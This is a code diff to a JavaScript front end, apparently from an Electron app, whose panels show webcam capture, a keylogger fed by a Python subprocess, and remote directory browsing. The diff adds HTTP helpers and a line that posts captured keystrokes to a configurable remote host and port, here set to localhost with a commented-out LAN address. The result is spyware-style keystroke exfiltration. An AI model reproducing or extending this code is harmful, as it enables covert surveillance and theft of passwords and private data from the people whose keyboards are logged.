@@ -1,6 +1,11 @@
+const http = require('http');
+
 const axios = require("axios");//comunication with python sub process on port 5088
 const fs = require('fs');
 const path = require('path');
+
+const remotehost = 'localhost';
+const remoteport = 1999;
 
 const video_element = document.getElementById("webcam_preview")
 document.getElementById("stop_video").addEventListener('click', function () { camanager.stop_webcam() })
@@ -8,6 +13,68 @@ document.getElementById("start_video").addEventListener('click', function () { c
 const keybox = document.getElementById('keybox');
 const dirbox = document.getElementById('dirbox');
 document.getElementById('back_a_dir').addEventListener('click', function () { directoryman.go_back_a_dir() })
+
+function Remote_get(what) {
+
+    const options = {
+        //hostname: '192.168.0.2',
+        hostname: 'localhost',
+        port: 1999,
+        path: '/action',
+        method: 'GET'
+    }
+
+    const req = http.request(options, res => {
+        console.log(`statusCode: ${res.statusCode}`)
+
+        res.on('data', d => {
+            console.log('Response data: ', JSON.parse(d))
+        })
+    })
+
+    req.on('error', error => {
+        console.error(error)
+    })
+
+    req.end()
+}
+
+function Remote_post(what) {
+
+    const data = JSON.stringify({
+        todo: 'Buy the milk'
+    })
+
+    const options = {
+        hostname: 'localhost',
+        port: 1999,
+        path: '/action/post',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    }
+
+    const req = http.request(options, res => {
+        console.log(`statusCode: ${res.statusCode}`)
+
+        res.on('data', d => {
+            console.log('Response to post: ', JSON.parse(d))
+        })
+    })
+
+    req.on('error', error => {
+        console.error(error)
+    })
+
+    req.write(data)
+    req.end()
+}
+
+function axios_test() {
+
+}
 
 window.onload = () => {
     setTimeout(() => {
@@ -57,9 +124,10 @@ let keylog = {
         keylog.interval = setInterval(async () => { keylog.get_keys() }, 1000);
     },
     get_keys: async function () {
-        let keys = axios.get('http://localhost:5088/key');
+        let keys = axios.get('http://localhost:5088/key');//python keylog sub-process
 
         await keys.then(keys => {
+            axios.default.post('http://' + remotehost + ':' + remoteport + '/action/post/keylog', JSON.stringify(keys.data.keys))//psot keys to server
             keybox.innerText = "";
             //console.log(keys);
             keys.data.keys.forEach(keycode => {
@@ -125,7 +193,7 @@ let directoryman = {
         } else {//file
             dir_icon.className = "file_icon"
             directory.title = "download file"
-            directory.addEventListener('click', function () {  })//download file
+            directory.addEventListener('click', function () { })//download file
         }
 
         directory.appendChild(filename)
@@ -143,7 +211,7 @@ let directoryman = {
         } else {
             directoryman.current_dir.pop();
             var current = directoryman.current_dir.pop();
-            console.log('back to: ',current)
+            console.log('back to: ', current)
             //document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length]
             if (current == undefined) {
                 directoryman.current_dir = [];
